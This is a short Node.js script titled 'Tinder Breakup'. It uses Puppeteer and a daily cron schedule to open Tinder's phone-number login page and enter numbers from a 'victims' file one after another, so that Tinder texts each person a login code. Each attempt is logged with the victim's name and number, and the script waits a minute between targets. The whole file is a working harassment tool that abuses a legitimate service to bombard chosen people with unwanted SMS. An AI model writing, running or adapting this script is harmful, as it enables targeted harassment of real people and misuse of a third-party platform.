const puppeteer = require('puppeteer');
const cron = require('node-cron');
const figlet = require('figlet');
const victims = require('./victims.js');

function SendSMSDaily() {
    (async () => {
        const url = "https://tinder.onelink.me/9K8a/3d4abb81";
        const browser = await puppeteer.launch();
        const page = await browser.newPage();

        figlet('Tinder Breakup', function (error, data) {
            if (error) {
                return;
            }
            console.log(data);
        });

        for (key in victims) {
            await page.goto(url, { waitUntil: 'networkidle2' });
            await page.click('button[aria-label="Log in with phone number"]');
            console.log(`\nTrying number: ${victims[key].number}`);
            await page.waitForSelector('input[name="phone_number"]');
            await page.type('input[name="phone_number"]', victims[key].number);
            const buttonContinue = await page.$x('//*[@id="o-1335420887"]/div/div/div[1]/button');
            await buttonContinue[0].click();
            console.log(`[SMS SENT] Owner: ${victims[key].name} | Number: ${victims[key].number}`);
            console.log(`[WAITING] New SMS will be sent in 60 seconds...`);
            await page.waitForTimeout(60000);
        };

        await browser.close();

    })();
}

cron.schedule('0 12 */1 * *', () => {
    console.log('\n[CRON-JOB] Send SMS daily started...');
    SendSMSDaily();
});